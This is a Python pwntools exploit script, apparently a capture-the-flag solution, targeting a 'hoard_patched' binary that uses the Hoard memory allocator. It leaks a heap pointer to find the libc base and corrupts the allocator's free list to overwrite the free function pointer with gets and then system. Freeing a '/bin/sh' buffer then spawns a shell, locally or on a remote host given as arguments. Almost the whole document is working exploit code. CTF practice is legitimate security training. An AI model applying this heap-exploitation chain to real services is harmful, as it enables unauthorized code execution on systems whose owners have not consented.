#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('hoard_patched')
libc = exe.libc
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    env = {"LD_PRELOAD":"libhoard.so"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, env=env, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pidof", "hoard"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, env=env, **kw)


gdbscript = '''
init-gef
brva 0x1384  
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def read(data):
    io.sendlineafter(b">", b"1")
    io.sendafter(b":", data)

def write():
    io.sendlineafter(b">", b"2")
    io.recvuntil(b" ")
    leak = io.recv(6)
    return u64(leak.ljust(8, b"\x00"))

def free():
    io.sendlineafter(b">", b"3")


def solve():

    for _ in range(0x10):
        read(b"A"*8)
    
    for _ in range(2):
        free()
    
    global_heap = write() 
    libc.address = global_heap - 0x3c0160
    info("global heap: %#x", global_heap)
    info("libc base: %#x", libc.address)
    
    got = libc.address + 0x40f078
    info("got free: %#x", got)

    try:
        read(p64(got))
        read(b"A"*8)
        read(p64(libc.sym["gets"]))
        free()

        rop = ROP(libc)
        pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
        sh = next(libc.search(b"/bin/sh\x00"))
        system = libc.sym["system"]

        payload = flat(
            [
                pop_rdi,
                sh,
                system
            ]
        )

        io.sendline(p64(libc.sym["system"]) + b"A"*(120-8) + p64(libc.sym["malloc"]))
        read(b"/bin/sh\x00")
        free()

        io.interactive()
    except Exception:
        io.close()


def main():
    for i in range(10):
        init()
        solve()
    

if __name__ == '__main__':
    main()
